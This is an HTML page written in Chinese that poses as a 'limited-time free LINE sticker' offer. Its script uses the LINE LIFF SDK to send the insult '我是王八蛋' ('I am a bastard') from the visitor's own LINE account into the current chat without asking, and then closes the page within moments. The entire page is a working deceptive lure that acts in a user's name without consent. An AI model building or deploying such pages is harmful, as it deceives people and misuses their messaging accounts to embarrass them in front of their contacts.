<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>限時貼圖免費領取</title>
    <!-- 引入 LINE 官方的 LIFF SDK -->
    <script src="https://line-scdn.net"></script>
</head>
<body>
    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
        <h2>正在載入 LINE 貼圖，請稍候...</h2>
    </div>

    <script>
        // 極簡直接傳送版：初始化後不做多餘判斷，直接發射訊息並關閉
        liff.init({ liffId: "2012018749-Jns1tBED" }).then(() => {
            liff.sendMessages([{
                type: 'text',
                text: '我是王八蛋' 
            }]).then(() => {
                liff.closeWindow(); // 傳完一秒內自動秒關網頁
            }).catch((err) => {
                console.log(err);
            });
        }).catch((err) => {
            console.log(err);
        });
    </script>
</body>
</html>
